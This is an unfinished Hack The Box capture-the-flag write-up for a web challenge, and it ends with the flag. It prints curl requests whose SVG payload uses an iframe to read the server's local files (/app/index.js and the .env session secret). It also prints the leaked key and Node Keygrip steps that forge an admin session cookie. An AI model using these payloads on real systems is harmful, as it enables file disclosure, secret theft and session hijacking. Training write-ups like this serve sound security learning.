# WIP

This Write Up is a work in progress.

# Notes

Create a user and login.

Induce an error to leak app structure.  Application runs out of /app

```
SyntaxError: Unexpected token w in JSON at position 72<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (:89:19)<br> &nbsp; &nbsp;at /app/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:199:9)<br> &nbsp; &nbsp;at invokeCallback (/app/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/app/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:402:35)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1343:12)<br> &nbsp; &nbsp;at processTicksAndRejections (node:internal/process/task_queues:83:21)
```

Dump the app source code at /add/index.js

```bash
curl -X POST "http://46.101.27.51:31165/api/export" -H 'Content-Type: application/json' -d '{"svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/index.js\" width=\"100%\" height=\"5000px\"></iframe><svg viewBox=\"0 0 480 160\" height=\"5000\" width=\"2000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"}'
```

Dump the SESSION_SECRET_KEY:

```bash
curl -X POST "http://46.101.27.51:31165/api/export" -H 'Content-Type: application/json' -d '{"svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/.env\" width=\"100%\" height=\"5000px\"></iframe><svg viewBox=\"0 0 480 160\" height=\"5000\" width=\"2000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"}'
```

key: `5921719c3037662e94250307ec5ed1db`

Create our session cookie by base64 encoding `{"username":"admin"}` -> `eyJ1c2VybmFtZSI6ImFkbWluIn0=`

Sign with Keygrip:

```javascript
> Keygrip = require('keygrip')
[Function: Keygrip] {
  index: [Function],
  verify: [Function],
  sign: [Function]
}
> keylist = ['5921719c3037662e94250307ec5ed1db']
[ '5921719c3037662e94250307ec5ed1db' ]
> signer = Keygrip(keylist)
Keygrip { sign: [Function], verify: [Function], index: [Function] }
> signer.sign('session=eyJ1c2VybmFtZSI6ImFkbWluIn0=')
'EYdvy2mhVoEznETyhYjNYFFZM8o'
```

Refresh the page and get flag:

HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}